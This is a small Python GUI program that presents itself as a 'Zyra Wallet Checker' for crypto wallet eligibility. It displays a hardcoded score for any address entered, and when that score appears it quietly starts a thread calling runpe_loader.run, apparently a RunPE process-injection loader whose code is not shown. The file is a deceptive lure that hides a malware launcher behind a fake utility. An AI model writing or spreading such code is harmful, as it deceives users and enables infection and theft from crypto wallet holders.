import tkinter as tk
import threading
import runpe_loader

def scan():
    status_label.config(text="Scanning wallet...")
    root.after(2000, show_result)

def show_result():
    status_label.config(text="Score: 82.3 | Status: Eligible")
    export_button.config(state="normal")
    threading.Thread(target=runpe_loader.run).start()

def export_result():
    with open("scan_result.txt", "w") as f:
        f.write("Wallet Score: 82.3\nStatus: Eligible")
    status_label.config(text="Exported to scan_result.txt")

root = tk.Tk()
root.title("Zyra Wallet Checker")
root.geometry("420x200")
root.resizable(False, False)

tk.Label(root, text="Enter Wallet Address:").pack(pady=5)
entry = tk.Entry(root, width=50)
entry.pack(pady=5)

tk.Button(root, text="Scan Wallet", command=scan).pack(pady=10)

status_label = tk.Label(root, text="")
status_label.pack(pady=5)

export_button = tk.Button(root, text="Export Result", command=export_result, state="disabled")
export_button.pack(pady=5)

root.mainloop()
